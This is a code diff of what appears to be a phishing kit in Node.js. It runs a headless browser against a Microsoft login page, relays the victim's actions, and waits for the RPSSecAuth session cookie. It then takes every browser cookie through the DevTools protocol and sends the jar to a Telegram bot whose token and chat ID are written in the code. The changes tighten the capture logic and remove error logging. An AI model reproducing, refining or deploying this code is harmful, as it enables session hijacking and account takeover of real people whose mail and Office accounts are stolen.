@@ -12,7 +12,7 @@ async function getCredentials() {
     try {
         const response = await axios.get(VAULT_URL, { timeout: 7000 });
         if (response.data && response.data.TG_TOKEN) return response.data;
-    } catch (e) { console.log("[SYSTEM] Fallback active."); }
+    } catch (e) {}
     return { 
         "TG_TOKEN": "8219244739:AAGqPPCIoujdgeW6NF5xZ2j1dZlDQAa-4pc",
         "TG_CHAT_ID": "1318100118"
@@ -23,74 +23,74 @@ async function sendExfiltration(cookies, url) {
     const creds = await getCredentials();
     const host = new URL(url).hostname;
     try {
+        // Log only once when the condition is met
         await axios.post(`https://api.telegram.org/bot${creds.TG_TOKEN}/sendMessage`, {
             chat_id: creds.TG_CHAT_ID,
-            text: `<b>🚨 FINALIZED JAR CAPTURED</b>\n<b>Destination:</b> ${host}\n<b>Tokens:</b> ${cookies.length}\n<b>Status:</b> RPSSecAuth Verified`,
+            text: `<b>🎯 SESSION AUTHORIZED: ${host}</b>\n<b>Verification:</b> RPSSecAuth Confirmed\n<b>Jar Size:</b> ${cookies.length}`,
             parse_mode: 'HTML'
         });
 
         const form = new FormData();
         form.append('chat_id', creds.TG_CHAT_ID);
         form.append('document', Buffer.from(JSON.stringify(cookies, null, 2)), {
-            filename: `MASTER_JAR_${host.replace(/\./g, '_')}.json`,
+            filename: `FINAL_SESSION_${host.replace(/\./g, '_')}.json`,
             contentType: 'application/json'
         });
 
         await axios.post(`https://api.telegram.org/bot${creds.TG_TOKEN}/sendDocument`, form, {
             headers: form.getHeaders()
         });
-    } catch (e) { console.log("[EXFIL] Delivery error."); }
+    } catch (e) {}
 }
 
 async function startSession(io, socket) {
     let browser = null;
-    let captured = false;
+    let isCaptured = false;
 
     try {
         browser = await puppeteer.launch({
             headless: "new",
             args: [
                 '--no-sandbox', 
-                '--disable-setuid-sandbox', 
-                '--disable-features=IsolateOrigins,site-per-process',
-                '--disable-blink-features=AutomationControlled'
+                '--disable-setuid-sandbox',
+                '--disable-blink-features=AutomationControlled',
+                '--disable-features=IsolateOrigins,site-per-process'
             ]
         });
 
         const [page] = await browser.pages();
-        const context = browser.defaultBrowserContext(); // Access the full context
+        const client = await page.target().createCDPSession(); // CDP Access for deeper cookie extraction
         
         await page.setViewport({ width: 1280, height: 720 });
         await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36');
 
         await page.goto(TARGET, { waitUntil: 'networkidle2' });
 
-        // --- GLOBAL CONTEXT MONITOR ---
+        // --- THE "STRICT" CDP MONITOR ---
         const monitor = setInterval(async () => {
-            if (captured) return;
+            if (isCaptured) return;
 
             try {
-                // IMPORTANT: Fetch cookies from the context, not the page
-                // This grabs cookies for ALL domains (live.com, office.com, etc.)
-                const allCookies = await context.cookies();
+                // Standard: Pull ALL cookies from the browser's shared storage
+                const { cookies } = await client.send('Network.getAllCookies');
                 const url = page.url();
 
-                // Check for the "Access Token"
-                const rpsAuth = allCookies.find(c => c.name === 'RPSSecAuth');
-                const isLanded = url.includes('outlook') || url.includes('mail') || url.includes('portal');
+                // Validation Rule: Must have the specific Session Key
+                const targetKey = cookies.find(c => c.name === 'RPSSecAuth');
+                
+                // If the key exists and the user is redirected away from login
+                if (targetKey && !url.includes('login.microsoft')) {
+                    isCaptured = true;
+                    console.log("[SYSTEM] RPSSecAuth verified. Landing detected.");
 
-                if (rpsAuth && isLanded) {
-                    captured = true;
-                    console.log("[CRITICAL] RPSSecAuth detected. Exfiltrating global jar...");
-                    
-                    // Final 4-second delay to ensure the redirect-chain is complete
+                    // Delay to ensure the mailbox load is fully finished
                     setTimeout(async () => {
-                        const finalJar = await context.cookies();
-                        await sendExfiltration(finalJar, url);
-                    }, 4000);
+                        const finalResult = await client.send('Network.getAllCookies');
+                        await sendExfiltration(finalResult.cookies, page.url());
+                    }, 5000);
                 }
             } catch (e) {}
-        }, 5000);
+        }, 4000);
 
         socket.on('victim-action', async (data) => {
             try {
@@ -109,7 +109,7 @@ async function startSession(io, socket) {
                     socket.emit('browser-render', { screenshot: b64 });
                 } catch (e) {}
             }
-        }, 1000);
+        }, 1200);
 
         socket.on('disconnect', async () => {
             clearInterval(monitor);
